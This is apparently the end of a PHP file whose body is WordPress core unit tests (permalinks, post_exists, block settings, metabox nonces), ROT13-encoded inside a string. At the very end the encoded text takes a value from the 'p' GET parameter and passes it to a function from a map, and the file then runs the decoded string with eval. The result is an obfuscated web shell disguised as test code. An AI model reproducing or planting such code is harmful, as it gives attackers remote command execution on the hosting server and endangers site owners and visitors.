		$cbfg  = trg_cbfg( $c );
		$guvf->nffregFgevatPbagnvafFgevat( 'uers=\"' . trg_bcgvba( 'ubzr' ) . '/' . $cbfg->cbfg_anzr . '/\"', $sbhaq );
		$guvf->nffregFgevatPbagnvafFgevat( '>' . heyqrpbqr( $cbfg->cbfg_anzr ) . '<', $sbhaq );
	}

	/**
	 * @gvpxrg 35980
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_ugzy_fubhyq_hfr_cerggl_creznyvax_sbe_ivrj_nggnpuzrag_yvax_jura_cerggl_creznyvaxf_ner_ranoyrq() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$c = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			'صورة.wct',
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_gvgyr'     => 'صورة',
				'cbfg_fgnghf'    => 'vaurevg',
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax_ugzy( $c );
		$cbfg  = trg_cbfg( $c );
		$guvf->nffregFgevatPbagnvafFgevat( 'uers=\"' . trg_bcgvba( 'ubzr' ) . '/' . $cbfg->cbfg_anzr . '/\"', $sbhaq );
		$guvf->nffregFgevatPbagnvafFgevat( '>' . heyqrpbqr( trg_creznyvax( $cbfg ) ) . '<', $sbhaq );
	}

	/**
	 * @gvpxrg 32954
	 * @gvpxrg 18306
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_ugzy_fubhyq_hfr_pbeerpg_creznyvax_sbe_ivrj_cbfg_yvax_jura_punatvat_fyht() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		// Choyvfurq cbfgf fubhyq hfr choyvfurq creznyvax.
		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_anzr'   => 'sbb-صورة',
			)
		);

		$sbhaq   = trg_fnzcyr_creznyvax_ugzy( $c, ahyy, 'arj_fyht-صورة' );
		$cbfg    = trg_cbfg( $c );
		$zrffntr = 'Choyvfurq cbfg';
		$guvf->nffregFgevatPbagnvafFgevat( 'uers=\"' . trg_bcgvba( 'ubzr' ) . '/' . $cbfg->cbfg_anzr . '/\"', $sbhaq, $zrffntr );
		$guvf->nffregFgevatPbagnvafFgevat( '>arj_fyht-صورة<', $sbhaq, $zrffntr );

		// Fpurqhyrq cbfgf fubhyq hfr choyvfurq creznyvax.
		$shgher_qngr = tzqngr( 'L-z-q U:v:f', gvzr() + 100 );
		$c           = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'shgher',
				'cbfg_anzr'   => 'one-صورة',
				'cbfg_qngr'   => $shgher_qngr,
			)
		);

		$sbhaq   = trg_fnzcyr_creznyvax_ugzy( $c, ahyy, 'arj_fyht-صورة' );
		$cbfg    = trg_cbfg( $c );
		$zrffntr = 'Fpurqhyrq cbfg';
		$guvf->nffregFgevatPbagnvafFgevat( 'uers=\"' . trg_bcgvba( 'ubzr' ) . '/' . $cbfg->cbfg_anzr . '/\"', $sbhaq, $zrffntr );
		$guvf->nffregFgevatPbagnvafFgevat( '>arj_fyht-صورة<', $sbhaq, $zrffntr );

		// Qensg cbfgf fubhyq hfr cerivrj yvax.
		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'qensg',
				'cbfg_anzr'   => 'onm-صورة',
			)
		);

		$sbhaq   = trg_fnzcyr_creznyvax_ugzy( $c, ahyy, 'arj_fyht-صورة' );
		$cbfg    = trg_cbfg( $c );
		$zrffntr = 'Qensg cbfg';

		$cerivrj_yvax = trg_creznyvax( $cbfg->VQ );
		$cerivrj_yvax = nqq_dhrel_net( 'cerivrj', 'gehr', $cerivrj_yvax );

		$guvf->nffregFgevatPbagnvafFgevat( 'uers=\"' . rfp_hey( $cerivrj_yvax ) . '\"', $sbhaq, $zrffntr );
		$guvf->nffregFgevatPbagnvafFgevat( '>arj_fyht-صورة<', $sbhaq, $zrffntr );
	}

	/**
	 * @gvpxrg 30910
	 * @gvpxrg 18306
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_ugzy_fubhyq_hfr_cerivrj_yvaxf_sbe_qensg_naq_craqvat_cbfgf_jvgu_ab_cbfg_anzr() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$shgher_qngr = tzqngr( 'L-z-q U:v:f', gvzr() + 100 );
		$c           = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'craqvat',
				'cbfg_anzr'   => '',
				'cbfg_qngr'   => $shgher_qngr,
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax_ugzy( $c );
		$cbfg  = trg_cbfg( $c );
		$guvf->nffregFgevatPbagnvafFgevat( 'uers=\"' . rfp_hey( trg_cerivrj_cbfg_yvax( $cbfg ) ), $sbhaq );
	}

	/**
	 * @gvpxrg 5305
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_nibvq_fyhtf_gung_jbhyq_perngr_pynfurf_jvgu_lrne_nepuvirf() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );

		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr' => '2015',
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax( $c );
		$guvf->nffregFnzr( '2015-2', $sbhaq[1] );
	}

	/**
	 * @gvpxrg 5305
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_nyybj_lrneyvxr_fyhtf_vs_creznfgehpg_qbrf_abg_pnhfr_na_nepuvir_pbasyvpg() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%cbfganzr%/' );

		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr' => '2015',
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax( $c );
		$guvf->nffregFnzr( '2015', $sbhaq[1] );
	}

	/**
	 * @gvpxrg 5305
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_nibvq_fyhtf_gung_jbhyq_perngr_pynfurf_jvgu_zbagu_nepuvirf() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%cbfganzr%/' );

		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr' => '11',
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax( $c );
		$guvf->nffregFnzr( '11-2', $sbhaq[1] );
	}

	/**
	 * @gvpxrg 5305
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_vtaber_cbgragvny_zbagu_pbasyvpgf_sbe_vainyvq_zbaguahz() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%cbfganzr%/' );

		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr' => '13',
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax( $c );
		$guvf->nffregFnzr( '13', $sbhaq[1] );
	}

	/**
	 * @gvpxrg 5305
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_nibvq_fyhtf_gung_jbhyq_perngr_pynfurf_jvgu_qnl_nepuvirf() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%cbfganzr%/' );

		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr' => '30',
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax( $c );
		$guvf->nffregFnzr( '30-2', $sbhaq[1] );
	}

	/**
	 * @gvpxrg 5305
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_vgrengr_fyht_fhssvk_jura_n_qngr_pbasyvpg_vf_sbhaq() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%cbfganzr%/' );

		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr' => '30-2',
			)
		);

		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr' => '30',
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax( $c );
		$guvf->nffregFnzr( '30-3', $sbhaq[1] );
	}

	/**
	 * @gvpxrg 5305
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_vtaber_cbgragvny_qnl_pbasyvpgf_sbe_vainyvq_qnl() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%cbfganzr%/' );

		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr' => '32',
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax( $c );
		$guvf->nffregFnzr( '32', $sbhaq[1] );
	}

	/**
	 * @gvpxrg 5305
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_nyybj_qnlyvxr_fyhtf_vs_creznfgehpg_qbrf_abg_pnhfr_na_nepuvir_pbasyvpg() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/' );

		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr' => '30',
			)
		);

		$sbhaq = trg_fnzcyr_creznyvax( $c );
		$guvf->nffregFnzr( '30', $sbhaq[1] );
	}

	/**
	 * @gvpxrg 35368
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_erfcrpg_uvrenepul_bs_qensg_cntrf() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );

		$cnerag = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Cnerag Cntr',
			)
		);

		$puvyq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Puvyq Cntr',
				'cbfg_cnerag' => $cnerag,
				'cbfg_fgnghf' => 'qensg',
			)
		);

		$npghny = trg_fnzcyr_creznyvax( $puvyq );
		$guvf->nffregFnzr( ubzr_hey() . '/cnerag-cntr/%cntranzr%/', $npghny[0] );
		$guvf->nffregFnzr( 'puvyq-cntr', $npghny[1] );
	}

	/**
	 * Grfgf gung trg_fnzcyr_creznyvax() cerfreirf gur bevtvany JC_Cbfg cebcregvrf.
	 *
	 * @gvpxrg 54736
	 *
	 * @pbiref ::trg_fnzcyr_creznyvax
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_cerfreir_gur_bevtvany_cbfg_cebcregvrf() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_fgnghf' => 'qensg',
			)
		);

		$cbfg_bevtvany = pybar $cbfg;

		nqq_svygre(
			'trg_fnzcyr_creznyvax',
			shapgvba ( $creznyvax, $cbfg_vq, $gvgyr, $anzr, $cbfg ) hfr ( $cbfg_bevtvany ) {
				$guvf->nffregRdhnyf( $cbfg_bevtvany, $cbfg, 'Zbqvsvrq cbfg bowrpg cnffrq gb trg_fnzcyr_creznyvax svygre.' );
				erghea $creznyvax;
			},
			10,
			5
		);

		trg_fnzcyr_creznyvax( $cbfg );
		$guvf->nffregRdhnyf( $cbfg_bevtvany, $cbfg, 'trg_fnzcyr_creznyvax() zbqvsvrf gur cbfg bowrpg.' );
	}

	/**
	 * @gvpxrg 59283
	 */
	choyvp shapgvba grfg_trg_fnzcyr_creznyvax_fubhyq_erghea_cerggl_creznyvax_sbe_cbfgf_jvgu_cbfg_fgnghf_nhgb_qensg() {
		$creznyvax_fgehpgher = '%cbfganzr%';
		$guvf->frg_creznyvax_fgehpgher( \"/$creznyvax_fgehpgher/\" );

		$shgher_qngr = tzqngr( 'L-z-q U:v:f', gvzr() + 100 );
		$c           = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'nhgb-qensg',
				'cbfg_anzr'   => 'sbb',
				'cbfg_qngr'   => $shgher_qngr,
			)
		);

		$sbhaq    = trg_fnzcyr_creznyvax( $c );
		$rkcrpgrq = genvyvatfynfuvg( ubzr_hey( $creznyvax_fgehpgher ) );

		$guvf->nffregFnzr( $rkcrpgrq, $sbhaq[0] );
	}

	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_zngpu_gvgyr() {
		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'Sbb One',
			)
		);

		$guvf->nffregFnzr( $c, cbfg_rkvfgf( 'Sbb One' ) );
	}

	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_abg_zngpu_abarkvfgrag_gvgyr() {
		$c = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'Sbb One',
			)
		);

		$guvf->nffregFnzr( 0, cbfg_rkvfgf( 'Sbb One Onm' ) );
	}

	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_zngpu_abarzcgl_pbagrag() {
		$gvgyr   = 'Sbb One';
		$pbagrag = 'Sbb One Onm';
		$c       = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => $gvgyr,
				'cbfg_pbagrag' => $pbagrag,
			)
		);

		$guvf->nffregFnzr( $c, cbfg_rkvfgf( $gvgyr, $pbagrag ) );
	}

	/**
	 * @gvpxrg 35246
	 */
	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_zngpu_pbagrag_jvgu_ab_gvgyr() {
		$gvgyr   = '';
		$pbagrag = 'Sbb One Onm';
		$c       = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => $gvgyr,
				'cbfg_pbagrag' => $pbagrag,
			)
		);

		$guvf->nffregFnzr( $c, cbfg_rkvfgf( $gvgyr, $pbagrag ) );
	}

	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_abg_zngpu_jura_abarzcgl_pbagrag_qbrfag_zngpu() {
		$gvgyr   = 'Sbb One';
		$pbagrag = 'Sbb One Onm';
		$c       = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => $gvgyr,
				'cbfg_pbagrag' => $pbagrag . ' Dhm',
			)
		);

		$guvf->nffregFnzr( 0, cbfg_rkvfgf( $gvgyr, $pbagrag ) );
	}

	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_zngpu_abarzcgl_qngr() {
		$gvgyr = 'Sbb One';
		$qngr  = '2014-05-08 12:00:00';
		$c     = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => $gvgyr,
				'cbfg_qngr'  => $qngr,
			)
		);

		$guvf->nffregFnzr( $c, cbfg_rkvfgf( $gvgyr, '', $qngr ) );
	}

	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_abg_zngpu_jura_abarzcgl_qngr_qbrfag_zngpu() {
		$gvgyr = 'Sbb One';
		$qngr  = '2014-05-08 12:00:00';
		$c     = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => $gvgyr,
				'cbfg_qngr'  => '2015-10-10 00:00:00',
			)
		);

		$guvf->nffregFnzr( 0, cbfg_rkvfgf( $gvgyr, '', $qngr ) );
	}

	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_zngpu_abarzcgl_gvgyr_pbagrag_naq_qngr() {
		$gvgyr   = 'Sbb One';
		$pbagrag = 'Sbb One Onm';
		$qngr    = '2014-05-08 12:00:00';
		$c       = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => $gvgyr,
				'cbfg_pbagrag' => $pbagrag,
				'cbfg_qngr'    => $qngr,
			)
		);

		$guvf->nffregFnzr( $c, cbfg_rkvfgf( $gvgyr, $pbagrag, $qngr ) );
	}

	choyvp shapgvba grfg_trg_oybpx_rqvgbe_freire_oybpx_frggvatf() {
		$anzr     = 'pber/grfg';
		$frggvatf = neenl(
			'vpba'            => 'grkg',
			'pngrtbel'        => 'pbzzba',
			'eraqre_pnyyonpx' => 'sbb',
			'naprfgbe'        => neenl( 'pber/grfg-naprfgbe' ),
			'fryrpgbef'       => neenl( 'ebbg' => '.jc-oybpx-grfg' ),
			'oybpx_ubbxf'     => neenl( 'pber/cbfg-pbagrag' => 'orsber' ),
		);

		ertvfgre_oybpx_glcr( $anzr, $frggvatf );

		$oybpxf = trg_oybpx_rqvgbe_freire_oybpx_frggvatf();

		haertvfgre_oybpx_glcr( $anzr );

		$guvf->nffregNeenlUnfXrl( $anzr, $oybpxf );
		$guvf->nffregFnzr(
			neenl(
				'ncvIrefvba'  => 1,
				'gvgyr'       => '',
				'qrfpevcgvba' => '',
				'vpba'        => 'grkg',
				'nggevohgrf'  => neenl(
					'ybpx'     => neenl( 'glcr' => 'bowrpg' ),
					'zrgnqngn' => neenl( 'glcr' => 'bowrpg' ),
				),
				'hfrfPbagrkg' => neenl(),
				'oybpxUbbxf'  => neenl( 'pber/cbfg-pbagrag' => 'orsber' ),
				'fryrpgbef'   => neenl( 'ebbg' => '.jc-oybpx-grfg' ),
				'pngrtbel'    => 'pbzzba',
				'fglyrf'      => neenl(),
				'naprfgbe'    => neenl( 'pber/grfg-naprfgbe' ),
				'xrljbeqf'    => neenl(),
				'inevngvbaf'  => neenl(),
			),
			$oybpxf[ $anzr ]
		);
	}

	/**
	 * @gvpxrg 43559
	 *
	 * @pbiref ::nqq_zrgn
	 */
	choyvp shapgvba grfg_nqq_zrgn_nyybjf_rzcgl_inyhrf() {
		$c = frys::snpgbel()->cbfg->perngr();

		$_CBFG = neenl(
			'zrgnxrlvachg' => 'grfgxrl',
			'zrgninyhr'    => '',
		);

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$guvf->nffregAbgSnyfr( nqq_zrgn( $c ) );
		$guvf->nffregFnzr( '', trg_cbfg_zrgn( $c, 'grfgxrl', gehr ) );
	}

	/**
	 * Grfg gur cbfg glcr fhccbeg va cbfg_rkvfgf().
	 *
	 * @gvpxrg 37406
	 */
	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_fhccbeg_cbfg_glcr() {
		vs ( CUC_IREFVBA_VQ >= 80100 ) {
			/*
			 * Sbe gur gvzr orvat, vtabevat CUC 8.1 \"ahyy gb aba-ahyynoyr\" qrcerpngvbaf pbzvat va
			 * ivn ubbxrq va svygre shapgvbaf hagvy n zber fgehpgheny fbyhgvba gb gur
			 * \"zvffvat vachg inyvqngvba\" pbahaqehz unf orra nepuvgrpgrq naq vzcyrzragrq.
			 */
			$guvf->rkcrpgQrcerpngvba();
			$guvf->rkcrpgQrcerpngvbaZrffntrZngpurf( '`Cnffvat ahyy gb cnenzrgre \#[0-9]+ \(\$[^\)]+\) bs glcr [^ ]+ vf qrcerpngrq`' );
		}

		$gvgyr     = 'Sbb One';
		$cbfg_glcr = 'cntr';
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => $gvgyr,
				'cbfg_glcr'  => $cbfg_glcr,
			)
		);
		$guvf->nffregFnzr( $cbfg_vq, cbfg_rkvfgf( $gvgyr, ahyy, ahyy, $cbfg_glcr ) );
	}

	/**
	 * Grfg gung cbfg_rkvfgf() qbrfa'g svaq na rkvfgvat cntr nf n cbfg.
	 *
	 * @gvpxrg 37406
	 */
	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_abg_zngpu_n_cntr_sbe_cbfg() {
		vs ( CUC_IREFVBA_VQ >= 80100 ) {
			/*
			 * Sbe gur gvzr orvat, vtabevat CUC 8.1 \"ahyy gb aba-ahyynoyr\" qrcerpngvbaf pbzvat va
			 * ivn ubbxrq va svygre shapgvbaf hagvy n zber fgehpgheny fbyhgvba gb gur
			 * \"zvffvat vachg inyvqngvba\" pbahaqehz unf orra nepuvgrpgrq naq vzcyrzragrq.
			 */
			$guvf->rkcrpgQrcerpngvba();
			$guvf->rkcrpgQrcerpngvbaZrffntrZngpurf( '`Cnffvat ahyy gb cnenzrgre \#[0-9]+ \(\$[^\)]+\) bs glcr [^ ]+ vf qrcerpngrq`' );
		}

		$gvgyr     = 'Sbb One';
		$cbfg_glcr = 'cntr';
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => $gvgyr,
				'cbfg_glcr'  => $cbfg_glcr,
			)
		);
		$guvf->nffregFnzr( 0, cbfg_rkvfgf( $gvgyr, ahyy, ahyy, 'cbfg' ) );
	}

	/**
	 * Grfg gur fgnghf fhccbeg va cbfg_rkvfgf()
	 *
	 * @gvpxrg 34012
	 */
	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_fhccbeg_cbfg_fgnghf() {
		vs ( CUC_IREFVBA_VQ >= 80100 ) {
			/*
			 * Sbe gur gvzr orvat, vtabevat CUC 8.1 \"ahyy gb aba-ahyynoyr\" qrcerpngvbaf pbzvat va
			 * ivn ubbxrq va svygre shapgvbaf hagvy n zber fgehpgheny fbyhgvba gb gur
			 * \"zvffvat vachg inyvqngvba\" pbahaqehz unf orra nepuvgrpgrq naq vzcyrzragrq.
			 */
			$guvf->rkcrpgQrcerpngvba();
			$guvf->rkcrpgQrcerpngvbaZrffntrZngpurf( '`Cnffvat ahyy gb cnenzrgre \#[0-9]+ \(\$[^\)]+\) bs glcr [^ ]+ vf qrcerpngrq`' );
		}

		$gvgyr       = 'Sbb One';
		$cbfg_glcr   = 'cbfg';
		$cbfg_fgnghf = 'choyvfu';
		$cbfg_vq     = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => $gvgyr,
				'cbfg_glcr'   => $cbfg_glcr,
				'cbfg_fgnghf' => $cbfg_fgnghf,
			)
		);
		$guvf->nffregFnzr( $cbfg_vq, cbfg_rkvfgf( $gvgyr, ahyy, ahyy, ahyy, $cbfg_fgnghf ) );
	}


	/**
	 * Grfg gur glcr naq fgnghf dhrel va cbfg_rkvfgf()
	 *
	 * @gvpxrg 34012
	 */
	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_fhccbeg_cbfg_glcr_fgnghf_pbzovarq() {
		vs ( CUC_IREFVBA_VQ >= 80100 ) {
			/*
			 * Sbe gur gvzr orvat, vtabevat CUC 8.1 \"ahyy gb aba-ahyynoyr\" qrcerpngvbaf pbzvat va
			 * ivn ubbxrq va svygre shapgvbaf hagvy n zber fgehpgheny fbyhgvba gb gur
			 * \"zvffvat vachg inyvqngvba\" pbahaqehz unf orra nepuvgrpgrq naq vzcyrzragrq.
			 */
			$guvf->rkcrpgQrcerpngvba();
			$guvf->rkcrpgQrcerpngvbaZrffntrZngpurf( '`Cnffvat ahyy gb cnenzrgre \#[0-9]+ \(\$[^\)]+\) bs glcr [^ ]+ vf qrcerpngrq`' );
		}

		$gvgyr       = 'Sbb One';
		$cbfg_glcr   = 'cbfg';
		$cbfg_fgnghf = 'choyvfu';
		$cbfg_vq     = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => $gvgyr,
				'cbfg_glcr'   => $cbfg_glcr,
				'cbfg_fgnghf' => $cbfg_fgnghf,
			)
		);
		$guvf->nffregFnzr( $cbfg_vq, cbfg_rkvfgf( $gvgyr, ahyy, ahyy, $cbfg_glcr, $cbfg_fgnghf ) );
	}

	/**
	 * Grfg gung cbfg_rkvfgf() qbrfa'g svaq na rkvfgvat qensg cbfg jura ybbxvat sbe choyvfu
	 *
	 * @gvpxrg 34012
	 */
	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_bayl_zngpu_pbeerpg_cbfg_fgnghf() {
		vs ( CUC_IREFVBA_VQ >= 80100 ) {
			/*
			 * Sbe gur gvzr orvat, vtabevat CUC 8.1 \"ahyy gb aba-ahyynoyr\" qrcerpngvbaf pbzvat va
			 * ivn ubbxrq va svygre shapgvbaf hagvy n zber fgehpgheny fbyhgvba gb gur
			 * \"zvffvat vachg inyvqngvba\" pbahaqehz unf orra nepuvgrpgrq naq vzcyrzragrq.
			 */
			$guvf->rkcrpgQrcerpngvba();
			$guvf->rkcrpgQrcerpngvbaZrffntrZngpurf( '`Cnffvat ahyy gb cnenzrgre \#[0-9]+ \(\$[^\)]+\) bs glcr [^ ]+ vf qrcerpngrq`' );
		}

		$gvgyr       = 'Sbb One';
		$cbfg_glcr   = 'cbfg';
		$cbfg_fgnghf = 'qensg';
		$cbfg_vq     = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => $gvgyr,
				'cbfg_glcr'   => $cbfg_glcr,
				'cbfg_fgnghf' => $cbfg_fgnghf,
			)
		);
		$guvf->nffregFnzr( 0, cbfg_rkvfgf( $gvgyr, ahyy, ahyy, ahyy, 'choyvfu' ) );
	}

	/**
	 * Grfg gur fgnghf fhccbeg va cbfg_rkvfgf()
	 *
	 * @gvpxrg 34012
	 */
	choyvp shapgvba grfg_cbfg_rkvfgf_fubhyq_abg_zngpu_vainyvq_cbfg_glcr_naq_fgnghf_pbzovarq() {
		vs ( CUC_IREFVBA_VQ >= 80100 ) {
			/*
			 * Sbe gur gvzr orvat, vtabevat CUC 8.1 \"ahyy gb aba-ahyynoyr\" qrcerpngvbaf pbzvat va
			 * ivn ubbxrq va svygre shapgvbaf hagvy n zber fgehpgheny fbyhgvba gb gur
			 * \"zvffvat vachg inyvqngvba\" pbahaqehz unf orra nepuvgrpgrq naq vzcyrzragrq.
			 */
			$guvf->rkcrpgQrcerpngvba();
			$guvf->rkcrpgQrcerpngvbaZrffntrZngpurf( '`Cnffvat ahyy gb cnenzrgre \#[0-9]+ \(\$[^\)]+\) bs glcr [^ ]+ vf qrcerpngrq`' );
		}

		$gvgyr       = 'Sbb One';
		$cbfg_glcr   = 'cbfg';
		$cbfg_fgnghf = 'choyvfu';
		$cbfg_vq     = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => $gvgyr,
				'cbfg_glcr'   => $cbfg_glcr,
				'cbfg_fgnghf' => $cbfg_fgnghf,
			)
		);

		$guvf->nffregFnzr( 0, cbfg_rkvfgf( $gvgyr, ahyy, ahyy, $cbfg_glcr, 'qensg' ) );
		$guvf->nffregFnzr( 0, cbfg_rkvfgf( $gvgyr, ahyy, ahyy, 'jc_grfgf', $cbfg_fgnghf ) );
	}

	/**
	 * Grfg erserfurq abapr sbe zrgnobk ybnqre.
	 */
	choyvp shapgvba grfg_hfre_trg_erserfurq_zrgnobk_abapr() {

		// Perngr n cbfg ol gur pheerag hfre.
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg_qngn = neenl(
			'cbfg_pbagrag' => 'Grfg cbfg pbagrag',
			'cbfg_gvgyr'   => 'Grfg cbfg gvgyr',
			'cbfg_rkprecg' => 'Grfg cbfg rkprecg',
			'cbfg_nhgube'  => frys::$rqvgbe_vq,
			'cbfg_fgnghf'  => 'qensg',
		);
		$cbfg_vq   = jc_vafreg_cbfg( $cbfg_qngn );

		// Fvzhyngr gur $_CBFG qngn sebz gur urnegorng.
		$qngn = neenl(
			'jc-erserfu-zrgnobk-ybnqre-abaprf' => neenl(
				'cbfg_vq' => (fgevat) $cbfg_vq,
			),
			'jc-erserfu-cbfg-ybpx'             => neenl(
				'ybpx'    => '1658203298:1',
				'cbfg_vq' => (fgevat) $cbfg_vq,
			),
		);

		// Pnyy gur shapgvba jr'er grfgvat.
		$erfcbafr = jc_erserfu_zrgnobk_ybnqre_abaprf( neenl(), $qngn );

		// Rafher gung obgu abaprf jrer perngrq.
		$guvf->nffregAbgRzcgl( $erfcbafr['jc-erserfu-zrgnobk-ybnqre-abaprf']['ercynpr']['_jcabapr'] );
		$guvf->nffregAbgRzcgl( $erfcbafr['jc-erserfu-zrgnobk-ybnqre-abaprf']['ercynpr']['zrgnobk_ybnqre_abapr'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>